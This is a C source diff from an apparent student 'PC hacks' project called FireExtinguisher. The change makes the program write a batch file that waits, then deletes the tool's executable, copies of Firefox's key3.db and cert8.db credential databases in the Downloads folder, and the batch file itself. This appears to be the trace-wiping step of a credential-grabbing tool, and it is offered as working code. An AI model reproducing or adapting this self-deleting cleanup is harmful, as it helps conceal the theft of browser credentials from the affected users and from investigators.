@@ -6,11 +6,20 @@ int main()
 //Kevin Chang
    FILE *fp;
     char str[500];
-    char address[] = " \"C:\\Users\\USER\\Documents\\GitHub\\CS-196-PC-Hacks\\FireExtinguisher\\"; //change this to the customizable address
-    strcpy(str, "del ");
+  //  char address[] = " \"C:\\Users\\USER\\Documents\\GitHub\\CS-196-PC-Hacks\\FireExtinguisher\\"; //change this to the customizable address
+    char address[] = "%USERPROFILE%\\Downloads\\";
+    char del[] = "\r\ndel ";
+    strcpy(str, "timeout \/t 5");
+    strcat(str, del);
     strcat(str, address);
     strcat(str,"Extinguisher.exe\"");
-    strcat(str, "\r\ndel ");
+    strcat(str, del);
+    strcat(str, address);
+    strcat(str, "\\key3.db");
+    strcat(str, del);
+    strcat(str, address);
+    strcat(str, "\\cert8.db");
+    strcat(str, del);
     strcat(str, address);
     strcat(str,"text.bat\"");
 
@@ -26,7 +35,5 @@ int main()
    char newname[] = "text.bat";
 
    ret = rename(oldname, newname);
-    Sleep(1000);
-    //system("text.bat");
    return 0;
 }
